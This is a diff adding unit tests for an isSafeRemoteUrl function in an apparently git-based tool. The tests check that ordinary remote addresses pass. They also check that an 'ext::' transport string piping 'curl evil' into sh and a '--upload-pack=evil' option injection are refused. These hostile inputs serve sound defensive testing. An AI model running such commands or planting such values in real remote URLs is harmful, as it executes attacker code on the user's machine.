@@ -4,6 +4,7 @@ import {
   isFullyStaged,
   parseGitStatus,
   selectAllState,
+  isSafeRemoteUrl,
   touchesWorkingTree,
   type GitFileStatus,
 } from '../src/index.js';
@@ -131,5 +132,35 @@ describe('touchesWorkingTree', () => {
 
   it('is false for no events at all', () => {
     expect(touchesWorkingTree([])).toBe(false);
+  });
+});
+
+describe('isSafeRemoteUrl', () => {
+  it('accepts the addresses people actually use', () => {
+    expect(isSafeRemoteUrl('https://github.com/someone/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('http://git.example.invalid/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('ssh://git@example.invalid/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('git@github.com:someone/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('file:///Volumes/Backup/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('/Volumes/Backup/book.git')).toBe(true);
+    expect(isSafeRemoteUrl('  https://example.invalid/book.git  ')).toBe(true);
+  });
+
+  it('refuses the transport that runs a command', () => {
+    // `ext::` executes what follows, at the next fetch, on the author's
+    // machine. A pasted address must not be able to do that.
+    expect(isSafeRemoteUrl('ext::sh -c "curl evil | sh"')).toBe(false);
+  });
+
+  it('refuses an address git would read as an option', () => {
+    expect(isSafeRemoteUrl('--upload-pack=evil')).toBe(false);
+    expect(isSafeRemoteUrl('-x')).toBe(false);
+  });
+
+  it('refuses nothing at all, and things that are not addresses', () => {
+    expect(isSafeRemoteUrl('')).toBe(false);
+    expect(isSafeRemoteUrl('   ')).toBe(false);
+    expect(isSafeRemoteUrl('book.git')).toBe(false);
+    expect(isSafeRemoteUrl('../book.git')).toBe(false);
   });
 });
